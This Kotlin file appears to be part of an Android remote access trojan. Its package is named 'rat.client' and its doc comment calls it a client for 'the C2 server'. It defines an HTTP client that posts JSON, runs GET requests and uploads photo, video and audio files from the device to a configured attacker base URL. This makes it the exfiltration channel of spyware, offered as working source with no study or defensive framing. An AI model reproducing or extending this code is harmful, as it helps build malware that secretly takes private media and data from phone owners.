package com.rat.client.utils

import android.util.Log
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.rat.client.Config
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * HTTP client for communicating with the C2 server.
 * Handles all API requests including file uploads.
 */
object ApiClient {
    private val TAG = "ApiClient"
    private val gson = Gson()
    private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .connectionPool(ConnectionPool(5, 30, TimeUnit.SECONDS))
        .build()

    private fun buildUrl(endpoint: String): String {
        return "${Config.Api.BASE_URL}$endpoint"
    }

    /**
     * POST JSON to the server and return the response.
     */
    fun post(endpoint: String, jsonBody: JSONObject): JSONObject? {
        return try {
            val body = jsonBody.toString().toRequestBody(JSON_MEDIA_TYPE)
            val request = Request.Builder()
                .url(buildUrl(endpoint))
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Connection", "keep-alive")
                .build()

            val response = client.newCall(request).execute()
            val responseBody = response.body?.string()
            response.close()

            if (responseBody != null) {
                return try {
                    JSONObject(responseBody)
                } catch (e: Exception) {
                    Log.w(TAG, "Non-JSON response: $responseBody")
                    null
                }
            }
            null
        } catch (e: Exception) {
            Log.e(TAG, "POST error to $endpoint: ${e.message}")
            null
        }
    }

    /**
     * POST JSON array to the server.
     */
    fun postJsonArray(endpoint: String, jsonArray: JSONArray): JSONObject? {
        return try {
            val body = jsonArray.toString().toRequestBody(JSON_MEDIA_TYPE)
            val request = Request.Builder()
                .url(buildUrl(endpoint))
                .post(body)
                .addHeader("Content-Type", "application/json")
                .build()

            val response = client.newCall(request).execute()
            val responseBody = response.body?.string()
            response.close()
            responseBody?.let { JSONObject(it) }
        } catch (e: Exception) {
            Log.e(TAG, "POST array error: ${e.message}")
            null
        }
    }

    /**
     * Upload a file (photo, video, audio) to the server via multipart form.
     */
    fun uploadFile(
        endpoint: String,
        file: File,
        extraFields: Map<String, String> = emptyMap()
    ): JSONObject? {
        return try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)

            // Add extra fields
            extraFields.forEach { (key, value) ->
                requestBody.addFormDataPart(key, value)
            }

            // Add the file
            val mediaType = when {
                file.name.endsWith(".jpg") || file.name.endsWith(".jpeg") -> "image/jpeg"
                file.name.endsWith(".png") -> "image/png"
                file.name.endsWith(".mp4") -> "video/mp4"
                file.name.endsWith(".3gp") -> "audio/3gpp"
                file.name.endsWith(".mp3") -> "audio/mpeg"
                file.name.endsWith(".amr") -> "audio/amr"
                else -> "application/octet-stream"
            }

            requestBody.addFormDataPart("file", file.name,
                file.readBytes().toRequestBody(mediaType.toMediaType()))

            val request = Request.Builder()
                .url(buildUrl(endpoint))
                .post(requestBody.build())
                .build()

            val response = client.newCall(request).execute()
            val responseBody = response.body?.string()
            response.close()

            responseBody?.let { JSONObject(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
            null
        }
    }

    /**
     * GET request to the server.
     */
    fun get(endpoint: String): JSONObject? {
        return try {
            val request = Request.Builder()
                .url(buildUrl(endpoint))
                .get()
                .build()

            val response = client.newCall(request).execute()
            val responseBody = response.body?.string()
            response.close()
            responseBody?.let { JSONObject(it) }
        } catch (e: Exception) {
            Log.e(TAG, "GET error: ${e.message}")
            null
        }
    }
}

